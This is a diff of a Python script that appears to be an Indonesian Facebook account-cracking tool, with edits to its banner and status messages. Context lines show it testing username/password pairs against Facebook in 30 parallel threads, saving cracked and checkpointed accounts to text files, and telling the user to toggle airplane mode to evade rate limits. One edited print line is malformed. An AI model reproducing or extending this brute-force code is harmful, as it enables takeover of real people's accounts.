@@ -95,7 +95,7 @@ def fail():
 def peak():
     time.sleep(0.1)
     print("""
-\033[95m    _____    ___       ______   ______
+\033[95m _____    ___       ______   ______
 \033[95m  / ___/   /   |     / ____/  / ____/
 \033[95m  \__ \   / /| |    / / __   / __/
 \033[95m ___/ /  / ___ |   / /_/ /  / /___
@@ -191,7 +191,7 @@ def mbfv2():
                         with open('now.txt','a') as f:
                                 f.write(username + '[-]' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;93m  * \033[90m[\033[93mNdrex\033[90m]>\033[93m {username}\033[90m[\033[93m+\033[90m]\033[93m{password}                    ",end="")
+                   print(f"\r\033[1;93m  * \033[90m[\033[93mNdrex\033[90m]👎\033[93m {username}\033[90m[\033[93m+\033[90m]\033[93m{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
@@ -385,8 +385,8 @@ def mbfv2():
                    fail()
                    peak()
                    print('\033[96mSemua ID\x1b[1;91m :\033[96m ' + str(len(id)) + "\n\033[92m \n",end="")
-                   print('\n\033[95m [\033[1;92m+\033[95m] \033[96mhasil\033[92m Live\033[93m disimpan di \033[91m: \033[92mLive.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93mNdrex\033[92m disimpan di \033[91m: \033[92mcp.txt')
-                   print('\n [\x1b[1;91m▪\x1b[1;95m] \033[92mMainkan Mode Pesawat 3 Detik Untuk Menjeda Proces Creck\n')
+                   print('\n\033[95m [\033[1;92m+\033[95m] \033[96mhasil\033[92m Live\033[93m disimpan di \033[91m: \033[92mLive.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93m Ndrex\033[92m disimpan di \033[91m: \033[92mcp.txt')
+                   print('\n [\x1b[1;91m▪\x1b[1;95m] \033[92mjalan("\n%s [%s!%s]Mainkan Mode Pesawat 3 Detik Untuk Menjeda Proces Crek%(P,M,P))\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
                                   users = user.split('|')
